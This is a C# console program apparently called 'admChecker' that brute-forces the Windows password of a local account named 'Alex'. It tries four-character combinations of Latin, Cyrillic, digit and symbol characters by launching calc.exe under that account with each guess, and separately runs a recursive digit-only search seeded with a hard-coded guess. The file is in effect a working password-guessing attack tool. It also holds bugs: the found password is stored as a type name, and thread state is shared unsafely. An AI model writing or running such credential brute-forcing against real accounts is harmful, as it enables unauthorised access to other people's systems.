using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace admChecker
{
    class Program
    {
        static char[] array = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            ' ', '!', '\"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '_', '-', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~',
            'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я',
            'а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я' };

        static char[] arrayNum = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

        static char[] temp;
        static string realPassword = "";
        static object block = new object();
        
        static void Main(string[] args)
        {

            //CheckPassword("8863");
            Task task = Task.Run(() => CheckedFour(array));
            Task taskNum = Task.Run(() => CheckedFour(arrayNum));


            //temp = new char[] { '0', '0', '0', '0' };
            temp = new char[] { '7','7','6','3'};
            CheckedPass(4, temp, arrayNum);
            Task taskNum_1 = Task.Run(() => CheckedPass(4, temp, arrayNum));
            

            task.Wait();
            taskNum.Wait();
            taskNum_1.Wait();

            Console.WriteLine(realPassword.ToString());
            Console.ReadKey();

            
        }
        static private void CheckedFour(char[] arr)
        {
            char[] str = new char[4];
            for(int i = 0; i < arr.Length; i++)
            {
                str[0] = arr[i];
                for(int c = 0; c < arr.Length; c++)
                {
                    str[1] = arr[c];
                    for(int d = 0; d < arr.Length; d++)
                    {
                        str[2] = arr[d];
                        for(int e = 0; e < arr.Length; e++)
                        {
                            str[3] = arr[e];
                            lock (block)
                            {
                                if (realPassword != "")
                                    return;
                            }                            
                            try
                            {
                                SecureString securePwd = new SecureString();
                                foreach (var item in str)
                                {
                                    securePwd.AppendChar(item);
                                }
                                Process.Start("calc.exe", "Alex", securePwd, "");
                                realPassword = Convert.ToString(str);
                                return;
                            }
                            catch (Win32Exception ex)
                            {
                                // Todo
                            }
                        }
                    }
                }
            }
        }
        static private void CheckedPass(int lenPass, char[] temp, char[] arr)
        {
            int index=0;
            lenPass--;
            if (realPassword != "")
                return;
            if (lenPass != 0)
            {
                for(int i = 0;  temp[lenPass] != arr[i] && i < arr.Length; i++)
                {
                    index++;
                }
                for (int i = index; i < arr.Length; i++)
                {
                    temp[lenPass] = arr[i];
                    CheckedPass(lenPass, temp, arr);
                }
            }
            else
            {
                
                Task task = new Task(() => Checked(temp));
                for (int i = 0; i < arr.Length; i++)
                {
                    temp[lenPass] = arr[i];
                    if (realPassword != "")
                        return;
                    task = Task.Run(() => Checked(temp));
                    task.Wait();
                }
                
            }
            
        }
        static private void Checked(char[] arr)
        {
            try
            {
                SecureString securePwd = new SecureString();
                foreach (var item in arr)
                {
                    securePwd.AppendChar(item);
                }
                Process.Start("calc.exe", "Alex", securePwd, "");
                realPassword = Convert.ToString(temp);
                return;
            }
            catch (Win32Exception ex)
            {
                // Todo
            }
        }
    }
}
